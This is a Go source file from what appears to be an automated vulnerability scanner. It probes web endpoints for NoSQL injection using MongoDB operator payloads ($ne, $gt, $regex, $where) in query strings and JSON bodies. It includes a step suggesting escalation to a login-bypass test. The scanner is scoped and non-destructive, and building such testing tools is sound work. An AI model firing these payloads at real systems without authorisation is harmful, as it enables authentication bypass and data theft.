package scanner

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/scope"
)

// nosqliProbeParams are query-parameter and JSON-body field names that
// commonly flow into a NoSQL query predicate — authentication checks,
// user-lookup endpoints, search filters, and admin backends.
var nosqliProbeParams = []string{
	"username", "user", "email", "login", "password", "pass",
	"id", "uid", "account", "query", "q", "search", "filter",
}

// nosqliMaxAttempts caps probe budget per scan, consistent with other active
// probes.
const nosqliMaxAttempts = 12

// nosqliOperatorPayloads are MongoDB-style operator injection payloads for
// GET query-string probing. Each pair contains a "true" payload (expected to
// match many records and produce a successful / non-empty response) and the
// parameter name it overrides. We send a baseline request first so we can
// compare response lengths; a significantly larger (or auth-bypassing)
// response confirms injection.
var nosqliOperatorQueryPayloads = []string{
	// Classic $ne (not-equal) bypass: value[$ne]=nonexistent
	// This is sent as a query-string key overwrite via url.Values.
	"[$ne]",
	// $gt (greater-than) with empty string covers many auth handlers.
	"[$gt]",
	// $regex with empty pattern matches everything.
	"[$regex]",
}

// nosqliJSONPayloads are JSON body variants for POST endpoints that parse the
// body into a query predicate. Each payload is a JSON object fragment; the
// surrounding object is built per-request.
var nosqliJSONPayloads = []struct {
	key   string
	value interface{}
}{
	// $ne: password must not equal this string — matches any real user.
	{"$ne", "invalidpassword_abh"},
	// $gt: any string is greater than "".
	{"$gt", ""},
	// $regex: empty pattern matches everything.
	{"$regex", ""},
	// $where: JavaScript expression always returns true (MongoDB).
	{"$where", "1==1"},
}

// nosqliErrorSignatures are substrings in response bodies that confirm a
// NoSQL-specific parser error was exposed — these are more reliable than
// length-difference heuristics because they cannot appear in legitimate HTML.
var nosqliErrorSignatures = []string{
	// MongoDB driver / Mongoose error strings.
	"bsontypes",
	"queryfailed",
	"mongoerror",
	"mongo_error",
	"writeconflict",
	"e11000 duplicate key",
	"cast to objectid failed",
	"unknown top level operator",
	`{"$err"`,
	`"errmsg"`,
	// Node.js / Mongoose stack traces.
	"at model.query",
	"casttostring failed",
	// Generic NoSQL driver errors.
	"nosql",
	"couchdb error",
	"documentdb",
	"mongoclient",
	"filteringdocument",
}

// runActiveNoSQLiProbe is an active NoSQL-injection scanner. It probes both
// query-string parameters (MongoDB $ne/$gt/$regex operator injection via
// bracket-notation keys) and JSON POST bodies (direct operator injection into
// field values) against runtime-discovered endpoints.
//
// Two detection strategies are combined:
//  1. Error-string matching: response bodies are checked for MongoDB/NoSQL
//     driver error substrings.
//  2. Length-delta heuristic: if the probed response body is ≥50% longer
//     than the baseline response for the same endpoint+parameter, the
//     parameter is likely non-empty-selecting (operator bypass confirmed).
//
// The probe is non-destructive: it never uses $delete/$drop/$unset, never
// sends mutating verbs, and emits at most one finding per scan.
func (s *Service) runActiveNoSQLiProbe(ctx context.Context, input RunInput, body string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}

	candidates := extractRuntimeEndpoints(input.Target, body, input.Scope, 8)
	if len(input.Options.SeedRuntimeEndpoints) > 0 {
		candidates = append(candidates, input.Options.SeedRuntimeEndpoints...)
	}
	if len(candidates) == 0 {
		candidates = []string{input.Target}
	}

	if input.Emit != nil {
		input.Emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("active-nosqli %s", input.Target),
			Message: "Probing for NoSQL injection via operator payloads and JSON body injection",
		})
	}

	type hit struct {
		url       string
		param     string
		technique string
		evidence  string
	}

	var hits []hit
	// Each probe phase gets its own attempt counter so they don't compete
	// for the same budget — query-string exhausting its cap must not prevent
	// the JSON body phase from running.
	queryAttempts := 0
	jsonAttempts := 0

	// ── Query-string operator injection ──────────────────────────────────────
	for _, raw := range candidates {
		if queryAttempts >= nosqliMaxAttempts {
			break
		}
		base, err := url.Parse(strings.TrimSpace(raw))
		if err != nil || base.Scheme == "" || base.Host == "" {
			continue
		}
		for _, p := range nosqliProbeParams {
			if queryAttempts >= nosqliMaxAttempts {
				break
			}
			for _, suffix := range nosqliOperatorQueryPayloads {
				if queryAttempts >= nosqliMaxAttempts {
					break
				}
				// Baseline request (no injection).
				probe := *base
				q := probe.Query()
				q.Set(p, "abh_nosqli_baseline_9z3x")
				probe.RawQuery = q.Encode()
				baselineURL := probe.String()
				if !scope.IsURLInScope(baselineURL, input.Scope) {
					continue
				}
				baseReq, err := http.NewRequestWithContext(ctx, http.MethodGet, baselineURL, nil)
				if err != nil {
					continue
				}
				ApplyAuthProfile(baseReq, input.AuthProfile)
				baseResp, err := s.doRequestWithRetry(ctx, baseReq, input.Options)
				queryAttempts++
				if err != nil || baseResp == nil {
					continue
				}
				baseBody, _ := io.ReadAll(io.LimitReader(baseResp.Body, 64*1024))
				_ = baseResp.Body.Close()

				// Operator-injected request.
				// The key becomes e.g. "username[$ne]" in the query string.
				injectedKey := p + suffix
				probeOp := *base
				qOp := probeOp.Query()
				qOp.Set(injectedKey, "abh_nosqli_9z3x")
				probeOp.RawQuery = qOp.Encode()
				probeURL := probeOp.String()
				if !scope.IsURLInScope(probeURL, input.Scope) {
					continue
				}
				req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
				if err != nil {
					continue
				}
				ApplyAuthProfile(req, input.AuthProfile)
				resp, err := s.doRequestWithRetry(ctx, req, input.Options)
				queryAttempts++
				if err != nil || resp == nil {
					continue
				}
				respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
				_ = resp.Body.Close()

				// Error-string detection.
				if sig := matchNoSQLErrorSignature(string(respBody)); sig != "" {
					hits = append(hits, hit{
						url:       probeURL,
						param:     injectedKey,
						technique: "query-operator-error",
						evidence:  sig,
					})
					goto doneQueryProbes //nolint:gocritic // break nested loops
				}

				// Length-delta detection: probe body significantly longer than
				// baseline implies operator matched far more records.
				if len(baseBody) > 0 && len(respBody) >= len(baseBody)*3/2 {
					hits = append(hits, hit{
						url:   probeURL,
						param: injectedKey,
						technique: "query-operator-length-delta",
						evidence: fmt.Sprintf(
							"baseline=%d bytes, probed=%d bytes (≥50%% growth)",
							len(baseBody), len(respBody),
						),
					})
					goto doneQueryProbes //nolint:gocritic // break nested loops
				}
			}
		}
	}
doneQueryProbes:

	// ── JSON body operator injection ─────────────────────────────────────────
	if len(hits) == 0 {
		for _, raw := range candidates {
			if jsonAttempts >= nosqliMaxAttempts {
				break
			}
			base, err := url.Parse(strings.TrimSpace(raw))
			if err != nil || base.Scheme == "" || base.Host == "" {
				continue
			}
			if !scope.IsURLInScope(base.String(), input.Scope) {
				continue
			}
			for _, param := range nosqliProbeParams {
				if jsonAttempts >= nosqliMaxAttempts {
					break
				}
				for _, pl := range nosqliJSONPayloads {
					if jsonAttempts >= nosqliMaxAttempts {
						break
					}
					body := map[string]interface{}{
						param: map[string]interface{}{
							pl.key: pl.value,
						},
					}
					jsonBytes, err := json.Marshal(body)
					if err != nil {
						continue
					}
					req, err := http.NewRequestWithContext(
						ctx, http.MethodPost, base.String(),
						bytes.NewReader(jsonBytes),
					)
					if err != nil {
						continue
					}
					req.Header.Set("Content-Type", "application/json")
					ApplyAuthProfile(req, input.AuthProfile)
					resp, err := s.doRequestWithRetry(ctx, req, input.Options)
					jsonAttempts++
					if err != nil || resp == nil {
						continue
					}
					respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
					_ = resp.Body.Close()

					if sig := matchNoSQLErrorSignature(string(respBody)); sig != "" {
						curl := buildCurlReproducer(
							http.MethodPost, base.String(), input.AuthProfile,
							"application/json", string(jsonBytes),
						)
						hits = append(hits, hit{
							url:       base.String(),
							param:     param,
							technique: "json-body-operator-error",
							evidence:  fmt.Sprintf("signature=%q payload=%s curl=%s", sig, string(jsonBytes), curl),
						})
						goto doneJSONProbes
					}
					// Auth-bypass heuristic: 200 response on a likely auth
					// endpoint when sending an operator payload is suspicious.
					if resp.StatusCode == http.StatusOK &&
						isLikelyAuthEndpoint(base.Path) {
						curl := buildCurlReproducer(
							http.MethodPost, base.String(), input.AuthProfile,
							"application/json", string(jsonBytes),
						)
						hits = append(hits, hit{
							url:   base.String(),
							param: param,
							technique: "json-body-auth-bypass",
							evidence: fmt.Sprintf(
								"POST to likely auth endpoint returned 200 with operator payload %q in field %q; curl: %s",
								pl.key, param, curl,
							),
						})
						goto doneJSONProbes
					}
				}
			}
		}
	}
doneJSONProbes:

	if len(hits) == 0 {
		return nil
	}

	first := hits[0]
	urls := make([]string, 0, len(hits))
	for _, h := range hits {
		urls = append(urls, fmt.Sprintf("%s (param=%s, technique=%s)", h.url, h.param, h.technique))
	}

	curl := buildCurlReproducer(http.MethodGet, first.url, input.AuthProfile, "", "")

	steps := []string{
		fmt.Sprintf("Send a request to %s", first.url),
		fmt.Sprintf("Inject a NoSQL operator (e.g. %s) into the parameter %q.", nosqliOperatorQueryPayloads[0], first.param),
		"Observe the response for error messages leaking NoSQL driver internals, or an unexpectedly large result set indicating operator evaluation.",
		"Escalate to authentication-bypass testing by injecting {\"$ne\": \"x\"} into the password field of the login endpoint.",
	}

	return []model.Finding{{
		ID:                "active-nosqli",
		Category:          "input-validation",
		Severity:          model.SeverityHigh,
		Title:             "NoSQL injection: operator payload accepted in query parameter or JSON body",
		Description:       "A MongoDB-style query operator injected into a parameter was either processed by the backend (producing a NoSQL driver error) or caused a significantly larger result set than the baseline, indicating the operator was evaluated rather than treated as a string value. This pattern enables authentication bypass, data exfiltration, and privilege escalation on NoSQL-backed applications.",
		Evidence:          fmt.Sprintf("Injection evidence at: %s (first: %s)", strings.Join(limitStrings(urls, 6), "; "), first.evidence),
		Recommendation:    "Treat every user-controlled value as a plain string before passing it to a NoSQL query. Validate that query values are scalar types before use; reject or sanitise any input that contains MongoDB operator keys (keys starting with '$'). Use an ODM (e.g. Mongoose) that enforces type schemas at query build time.",
		Confidence:        0.85,
		AffectedURL:       first.url,
		AffectedParameter: first.param,
		CWE:               "CWE-943",
		OWASPCategory:     "A03:2021 - Injection",
		Sources:           []string{"active-scanner"},
		ReproductionSteps: steps,
		PoC:               curl,
		EvidenceFields: map[string]string{
			"validationType":  "active-probe",
			"technique":       first.technique,
			"evidenceDetail":  first.evidence,
			"reproStep":       "Replay the listed URL/body and observe a NoSQL error or enlarged result set",
			"curlReproducer":  curl,
		},
	}}
}

// matchNoSQLErrorSignature returns the first error substring found in the
// response body (case-insensitive), or "" when none match.
func matchNoSQLErrorSignature(body string) string {
	if body == "" {
		return ""
	}
	lower := strings.ToLower(body)
	for _, sig := range nosqliErrorSignatures {
		if strings.Contains(lower, sig) {
			return sig
		}
	}
	return ""
}

// isLikelyAuthEndpoint returns true when the path pattern suggests the
// endpoint handles authentication (login, signin, auth, token, session).
func isLikelyAuthEndpoint(path string) bool {
	lower := strings.ToLower(path)
	for _, keyword := range []string{"login", "signin", "sign-in", "auth", "token", "session", "password"} {
		if strings.Contains(lower, keyword) {
			return true
		}
	}
	return false
}
